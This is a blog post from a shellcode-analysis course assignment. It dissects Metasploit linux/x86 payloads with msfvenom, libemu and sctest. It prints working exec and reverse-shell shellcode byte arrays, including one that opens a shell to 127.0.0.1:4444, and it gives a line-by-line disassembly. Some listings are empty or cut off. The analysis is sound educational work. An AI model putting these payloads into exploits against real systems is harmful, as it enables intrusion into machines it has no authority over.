## Libemu and friends
For this task I used `msfvenom` instead of `msfpayload`, since this is the current standard tool to generate shellcodes. I also used `sctest`, a tool that is part of the `libemu` testsuite, just like in the videos. This package is available in Debian Stretch as `libemu2`.

    # apt install libemu2

Lets learn a little more about `libemu`:

    libemu is a small library written in c offering basic x86 emulation and shellcode detection using GetPC heuristics.

And what on earth is GetPC? [This](https://nets.ec/Shellcode/Environment#GetPc) page by NetSec will tell you:

```
The GetPc technique is implementation of code which obtains the current instruction pointer. This can be useful when writing self-modifying shellcode, or other code that must become aware of its environment, as environment information cannot be supplied prior to execution of the code. 
```

In short, it is an elegant way to get the address pointed by EIP, which is not directly accessible in x86.

```
jmp startup
getpc:
   mov (%esp), %eax
   ret
startup:
call getpc       ; the %eax register now contains %eip on the next line 
```

Ok, enough of learning about `libemu` internals. Moving on to `sctest`, this is a tool that allows, among other things, to generate a control flow graph for the shellcode and write it to a DOT file. This file can be rendered as an image using the `dot` utility.

	sctest allows to test streams for shellcode.

Based on the course videos and on [this] page I managed to create a one liner that generates an image of the shellcode flow.

    $ cat shellcode.hex | tr -d '\\\x' | xxd -r -p | sctest -vvv -Ss 99999 -G shellcode.dot; dot -Tpng -o shellcode.png shellcode.dot

## Selected shellcodes
Before picking 3 shellcodes to analyse I took a look at the payloads for `linux/x86` Metasploit has to offer:

```

```

I decided to analyse the following payloads.

### linux/x86/exec CMD="/bin/bash"
I used this one during [Assignment#3](https://marcosvalle.github.io/re/exploit/2018/08/23/egg-hunter.html) for spawning a shell after a buffer overflow using an egg hunter. Now it is time to understand what has happened under the hood.

```
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/bash" -f c
No encoder or badchars specified, outputting raw payload
Payload size: 45 bytes
Final size of c file: 213 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0a\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
```
This is a very simple shellcode, basically the stack is prepared and the syscall is called. However, there is on particularly interesting optimization here:

* Usage of `cwd` instruction to clear out edx. The sign of eax (0 in this case) is copied into dx, therefore clearing it out.

Line-by-line analysis:

```
push   0xb 
pop    eax  ;the first 2 lines set eax=0xb, which is the syscall number for sys_execve
cwd         ;clears edx
push   edx  ;pushes 0 into the stack
pushw  0x632d   ;pushes '-c' into the stack
mov    edi,esp  ;save the stack pointer in edi (points to -c)
push   0x68732f ;save /sh into the stack (little endian)
push   0x6e69622f   ;save /bin into the stack (little endian)
mov    ebx,esp  ;save the stack pointer in ebx (points to /bin/sh)
push   edx  ;push 0 into the stack      
call   0xf  ;probably related to stack alignment, not sure
push   edi  ;push -c again
push   ebx  ;push /bin/sh
mov    ecx,esp  ;save '/bin/sh -c' in ecx
;EAX=0xb
;EBX -> "/bin/sh"
;ECX -> Address of '/bin/sh -c'
;EDX ->
int    0x80; calls execve
```

As a bonus, lets see what happens when we try to avoid NULLs.

```
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/bash" -b '\x00' -f c

```
![exec_no_nulls](https://github.com/marcosValle/SLAE/blob/master/assignment5/exec_no_null.png)

Wow, not exactly what I was expecting. But looking the output more carefully:

     Attempting to encode payload with 1 iterations of x86/shikata_ga_nai

In order to avoid NULL bytes, msfvenom picks an encoder. In this case the infamous `shikata_ga_nai`. So I decided do my homework and check how this encoder works. Despite its frequent use, I could not find so many sources explaining the algorithm. But to not turn this post into a book I made another one dedicated to this subject.

You can find [my shikata_ga_nai analysis here](https://marcosvalle.github.io/re/exploit/2018/08/25/shikata-ga-nai.html)

### linux/x86/shell_reverse_tcp
I have also used the reverse_tcp shellcode when preparing [Assignment#2](https://marcosvalle.github.io/re/exploit/2018/08/20/reverse-shell-tcp.html) and was actually wondering how it works. 

```
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp -f c
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

![shell_reverse_tcp](https://github.com/marcosValle/SLAE/blob/master/assignment5/shell_reverse_tcp.png)

If you remember from our previous assignment, we used the following functions that were later converted to syscalls:

* int socket(int protocolFamily, int type, int protocol);
* int connect(int socket, struct sockaddr \*foreignAddress, unsigned int addressLength);
* int dup2(int oldfd, int newfd);
* int execve(const char \*filename, char \*const argv[],char \*const envp[]); 

They are all there. There are some differences between our simple shellcode and this elegant one. First, there are several optimizations, for example:

* Usage of `mul` instruction to clear registers
* Usage of `xchg` instruction to move the content of one register to another
* Usage of a loop structure for redirecting INPUT, OUTPUT and ERROR

Improvements apart, the essence of this shellcode is pretty much the same as ours.

### linux/x86/meterpreter/reverse_tcp
Now that we know what `linux/x86/shell_reverse_tcp`, why not looking at Meterpreter? Metasploit splits some of it payloads in Stageless and Staged categories. The first one corresponds to payloads that are delivered as a single chunk and you can identify them as `meterpreter_`. On the other hand, Staged payloads are delivered in parts. Initially the victim receives a small stage which then loads the following stages.

Since the stageless payload is humongous, I will analyse only the stalegess version.

```
msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp -f c
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of c file: 543 bytes

```

79: cd 80                   int    0x80 ;sys_exit
```

The idea is to create a socket then try to connect to a certain IP/PORT. If it does not succed, wait for a few seconds or the delivery of a signal (connection). If the time runs off, goes back to the beginning and try to connect once again. When if finally succeds, read whatever is sent (probably the next stage).
